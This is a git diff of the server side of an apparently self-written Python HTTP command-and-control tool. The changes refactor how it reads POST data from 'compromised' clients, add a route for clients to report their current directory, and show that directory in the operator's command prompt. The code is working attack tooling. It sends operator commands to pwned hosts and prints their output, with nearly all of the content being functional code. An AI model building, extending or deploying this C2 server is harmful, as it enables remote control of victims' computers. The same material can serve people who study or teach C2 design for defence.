@@ -3,7 +3,7 @@ from colorama import Fore
 from urllib.parse import unquote_plus
 
 #Constants Variables Imports
-from settings import PORT, CMD_REQUEST, RESPONSE, RESPONSE_KEY, BIND_ADDR
+from settings import CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, BIND_ADDR, PORT
 
 class C2Handler(BaseHTTPRequestHandler):
     """This class is a child of the BaseHTTPRequestHandler class.
@@ -48,7 +48,7 @@ class C2Handler(BaseHTTPRequestHandler):
             # If the client in pwnedDict and also is Active Session    
             elif client == pwnedDict[activeSession]:
                 # Collect Command from input to run on the client
-                command = input(Fore.RESET+f"{clientAccount}@{clientHostname}({clientIp}) > "+Fore.LIGHTYELLOW_EX)
+                command = input(Fore.RESET+f"({clientIp}){clientAccount}@{clientHostname}:{cwd}> "+Fore.LIGHTYELLOW_EX)
                 print(Fore.RESET)
 
                 # Send 200 status codes Write the Command back to the client as a Response; must use UTF-8 for encoding
@@ -112,27 +112,44 @@ class C2Handler(BaseHTTPRequestHandler):
         
         # Follow code when compromised Computer requesting command
         if self.path == RESPONSE:
-            # Send http Response code and header back to the client
-            self.http_response(200)
+            # Print Result of stdout arrived from the client in Plain Text format
+            print(self.handle_post_data())
 
+        # Follow code when a compromised Computer is responding with the current directory
+        elif self.path == CWD_RESPONSE:
+            global cwd
+            cwd = self.handle_post_data()
 
-            # Get Content Length value from http headers
-            contentLength = int(self.headers.get('Content-Length')) # noqa
-            
-            # gather the client's data by reading in the HTTP POST data
-            clientData = self.rfile.read(contentLength)
-            # Decode clientData
-            clientData = clientData.decode()
-            
-            # Remove the HTTP Post Variable and the equal sign from the client's data
-            clientData = clientData.replace(f"{RESPONSE_KEY}=", "", 1)
-            
-            #HTML/URL decode the Clients data(stdout) and translate "+" to a Space
-            clientData = unquote_plus(clientData)
-            
-            #Print Result of stdout arrived from the client in Plain Text format
-            print(clientData)  
+        # Else, if the path is not one of the Defined and Known paths, print a warning message
+        else:
+            """ NO body should ever post to our C2 Server other than the above paths; so 
+        this code block for security and avoiding posting from attackers"""
+            print(Fore.LIGHTRED_EX+f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
+                                   f"Why?\n Asking from yourself 🙃 \n")
 
+    def handle_post_data(self):
+        """ this function handles all http POST Requests arrived at the C2 client."""
+
+        # Send http Response code and header back to the client
+        self.http_response(200)
+
+        # Get Content Length value from http headers
+        contentLength = int(self.headers.get('Content-Length')) # noqa
+
+        # gather the client's data by reading in the HTTP POST data
+        clientData = self.rfile.read(contentLength)
+
+        # Decode clientData
+        clientData = clientData.decode()
+
+        # Remove the HTTP Post Variable and the equal sign from the client's data
+        clientData = clientData.replace(f"{RESPONSE_KEY}=", "", 1)
+
+        # HTML/URL decode the Clients data(stdout) and translate "+" to a Space
+        clientData = unquote_plus(clientData)
+
+        # Return Processed clientData
+        return clientData
 
     def http_response(self, code: int):
         """this function sends the HTTP Response codes
@@ -159,9 +176,12 @@ clientHostname = ""
 # Use to count and track each client connecting to C2 Servers(pwned by C2 Server)
 pwnedId = 0
 
-#Track all pwned clients; key = pwned_id and value is unique from each client.
+# Track all pwned clients; key = pwned_id and value is unique from each client.
 # value follow this pattern => (account@hostname@epoch time)
 pwnedDict = {}
+
+# This a current working directory from the client belonging to active session
+cwd = "~"
 
 # Instance from HTTP Server
 # noinspection PyTypeChecker
